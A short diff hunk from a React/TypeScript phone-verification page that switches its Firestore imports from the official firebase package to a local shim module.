@@ -11,7 +11,7 @@ import { CarrierVerificationModal } from "@/components/carrier-verification-moda
 import { PhoneOtpDialog } from "@/components/dialog-b";
 
 import { db, setDoc, doc } from "@/lib/firebase";
-import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
+import { onSnapshot, getDoc, Firestore } from "@/lib/firestore-shim";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 
 export default function VerifyPhonePage() {
